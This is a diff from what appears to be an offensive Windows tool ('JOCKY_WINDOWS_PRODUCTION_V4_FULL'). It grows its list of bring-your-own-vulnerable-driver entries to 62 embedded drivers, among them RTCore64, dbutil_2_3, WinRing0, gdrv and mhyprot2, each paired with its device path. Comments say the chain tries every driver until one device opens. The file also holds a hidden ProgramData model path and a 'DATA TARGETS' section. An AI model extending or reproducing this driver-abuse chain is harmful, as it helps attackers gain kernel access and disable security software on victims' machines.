@@ -11,17 +11,19 @@ const MODEL_FILE = "phi-3-mini-4k-instruct.gguf"
 const LOCAL_MODEL_PATH = "C:\\ProgramData\\.jocky_model"
 const BUILD_ID = "JOCKY_WINDOWS_PRODUCTION_V4_FULL"
 
-// ===== BYOVD DRIVERS (9 VERIFIED) =====
+// ===== BYOVD DRIVERS (62 EMBEDDED) =====
+// See src/jocky/core/embed_drivers.py for full list
+// Chain will try all drivers and use first successful device open
 const DRIVERS = [
     ("rtkiow10x64.sys", "\\\\.\\RTCore64"),
     ("rtkiow8x64.sys", "\\\\.\\RTCore64"),
-    ("AMDRyzenMasterDriver.sys", "\\\\.\\AMDRyzenMasterDriver"),
-    ("nvflsh64.sys", "\\\\.\\nvflsh64"),
-    ("speedfan.sys", "\\\\.\\speedfan"),
-    ("ene.sys", "\\\\.\\EneIo"),
-    ("iQVW64.SYS", "\\\\.\\Nal"),
-    ("UCOREW64.SYS", "\\\\.\\Global\\"),
-    ("NTIOLib.sys", "\\\\.\\NTIOLib"),
+    ("dbutil_2_3.sys", "\\\\.\\dbutil_2_3"),
+    ("WinRing0x64.sys", "\\\\.\\WinRing0_1_2_0"),
+    ("gdrv.sys", "\\\\.\\nvgdrv"),
+    ("mhyprot2.sys", "\\\\.\\mhyprot2"),
+    ("procxp64.sys", "\\\\.\\ProcExp"),
+    ("rentdrv2_x64.sys", "\\\\.\\rentdrv2"),
+    // ... and 54 more drivers (see research_chain_windows_production.jky)
 ]
 
 // ===== DATA TARGETS =====
